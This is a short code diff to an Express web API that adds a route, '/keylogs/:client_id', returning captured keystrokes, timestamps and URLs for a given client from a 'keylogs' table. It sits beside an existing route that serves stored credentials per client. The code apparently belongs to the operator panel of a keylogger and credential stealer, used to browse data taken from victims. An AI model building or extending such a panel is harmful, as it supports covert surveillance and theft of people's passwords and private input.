@@ -80,6 +80,16 @@ module.exports = function initializeWebUiApi(appWebUI) {
     const credentials = stmt.all(client_id);
     res.json(credentials);
   });
+  appWebUI.get("/keylogs/:client_id", (req, res) => {
+    const { client_id } = req.params;
+    const stmt = db.prepare(
+      `
+      SELECT timestamp,keystrokes,url FROM keylogs WHERE client_id = ?
+      `
+    );
+    const keylogs = stmt.all(client_id);
+    res.json(keylogs);
+  });
   appWebUI.get("/*", (req, res) => {
     res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
   });
